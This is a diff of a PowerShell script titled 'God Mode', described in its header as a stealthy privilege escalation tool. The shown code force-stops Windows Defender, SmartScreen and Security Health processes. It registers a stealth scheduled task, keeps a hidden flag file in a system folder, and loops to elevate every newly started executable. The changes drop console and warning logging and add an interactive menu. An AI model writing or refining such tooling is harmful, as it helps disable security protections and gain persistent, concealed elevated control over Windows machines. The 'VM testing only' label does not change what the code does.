@@ -2,18 +2,17 @@
 
 <#
 .SYNOPSIS
-    God Mode v12.1 - Improved Edition
+    God Mode v12.2 - Final Improved Version
 .DESCRIPTION
-    Stealthy + Dangerous privilege tool with better stability and duplicate prevention.
-    For VM testing only. Built-in Administrator only.
+    Stealthy + Dangerous privilege escalation tool.
+    For VM security testing only.
 #>
 
 param(
     [switch]$ToggleOn,
     [switch]$ToggleOff,
     [switch]$Status,
-    [switch]$Launch,
-    [switch]$VerboseLog
+    [switch]$Launch
 )
 
 $FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
@@ -40,10 +39,6 @@ function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
-    
-    if ($VerboseLog -or $Level -eq "ERROR" -or $Level -eq "WARN") {
-        Write-Host "[$timestamp] [$Level] $Message"
-    }
 }
 
 # ============================================================
@@ -60,8 +55,6 @@ function Enable-DangerousMode {
 
         Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
             Stop-Process -Force -ErrorAction SilentlyContinue
-
-        Write-Log "Dangerous mode enabled." "WARN"
     } catch {
         Write-Log "Error enabling dangerous mode: $_" "ERROR"
     }
@@ -104,7 +97,7 @@ function Unregister-StealthTask {
 }
 
 # ============================================================
-#  PROCESS ELEVATION (with duplicate prevention)
+#  PROCESS ELEVATION (with improved duplicate prevention)
 # ============================================================
 function Elevate-Process {
     param([string]$Path)
@@ -138,7 +131,7 @@ function Start-Monitoring {
 
     Write-Log "Monitoring started." "INFO"
 
-    $seen = @{}
+    $lastElevated = @{}   # Tracks when each process was last elevated
 
     while ($true) {
         Start-Sleep -Seconds 2
@@ -151,9 +144,14 @@ function Start-Monitoring {
 
             foreach ($proc in $newProcesses) {
                 if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
-                    if (-not $seen.ContainsKey($proc.ExecutablePath)) {
-                        $seen[$proc.ExecutablePath] = $true
-                        Elevate-Process $proc.ExecutablePath
+                    $path = $proc.ExecutablePath
+
+                    # Only elevate if not elevated recently (within last 30 seconds)
+                    if (-not $lastElevated.ContainsKey($path) -or 
+                        ($lastElevated[$path] -lt (Get-Date).AddSeconds(-30))) {
+
+                        $lastElevated[$path] = Get-Date
+                        Elevate-Process $path
                     }
                 }
             }
@@ -191,6 +189,32 @@ function Show-Status {
 }
 
 # ============================================================
+#  INTERACTIVE MENU
+# ============================================================
+function Show-Menu {
+    Clear-Host
+    Write-Host "=== GOD MODE v12.2 ===" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "1. Enable God Mode"
+    Write-Host "2. Disable God Mode"
+    Write-Host "3. Check Status"
+    Write-Host "4. Start Monitoring"
+    Write-Host "5. Exit"
+    Write-Host ""
+
+    $choice = Read-Host "Select an option (1-5)"
+
+    switch ($choice) {
+        "1" { Enable-GodMode; Write-Host "God Mode enabled." -ForegroundColor Green; Start-Sleep -Seconds 2; Show-Menu }
+        "2" { Disable-GodMode; Write-Host "God Mode disabled." -ForegroundColor Yellow; Start-Sleep -Seconds 2; Show-Menu }
+        "3" { Show-Status; Start-Sleep -Seconds 2; Show-Menu }
+        "4" { Start-Monitoring }
+        "5" { exit }
+        default { Write-Host "Invalid option." -ForegroundColor Red; Start-Sleep -Seconds 1; Show-Menu }
+    }
+}
+
+# ============================================================
 #  MAIN
 # ============================================================
 
@@ -199,24 +223,4 @@ if ($ToggleOff) { Disable-GodMode; exit }
 if ($Status)    { Show-Status; exit }
 if ($Launch)    { Start-Monitoring; exit }
 
-# Interactive Menu
-Clear-Host
-Write-Host "=== GOD MODE v12.1 ===" -ForegroundColor Cyan
-Write-Host ""
-Write-Host "1. Enable God Mode"
-Write-Host "2. Disable God Mode"
-Write-Host "3. Check Status"
-Write-Host "4. Start Monitoring"
-Write-Host "5. Exit"
-Write-Host ""
-
-$choice = Read-Host "Select option (1-5)"
-
-switch ($choice) {
-    "1" { Enable-GodMode; Write-Host "God Mode enabled." -ForegroundColor Green }
-    "2" { Disable-GodMode; Write-Host "God Mode disabled." -ForegroundColor Yellow }
-    "3" { Show-Status }
-    "4" { Start-Monitoring }
-    "5" { exit }
-    default { Write-Host "Invalid option." }
-}
+Show-Menu
